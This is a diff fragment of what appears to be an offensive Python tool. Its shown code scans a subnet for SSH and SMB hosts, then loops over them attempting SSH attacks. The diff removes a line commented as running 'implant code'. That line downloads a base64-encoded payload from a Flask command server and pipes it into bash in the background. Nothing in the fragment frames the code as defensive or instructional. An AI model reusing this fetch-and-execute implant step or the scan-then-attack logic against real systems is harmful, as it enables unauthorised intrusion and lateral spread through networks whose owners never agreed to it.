@@ -192,10 +192,6 @@ def network_scan(subnet="192.168.108.", ports=[22, 445]):
     return ssh_hosts, smb_hosts
 
 def perform_attack():
-    # Run implant code on host
-    command = f"curl http://{FLASK_HOST}:{FLASK_PORT}/static/lin | base64 -d | bash &"
-    os.system(command)
-
     ssh_hosts, smb_hosts = network_scan(TARGET_SUBNET)
     for host in ssh_hosts:
         print(f"Attempting ssh attack for {host}")
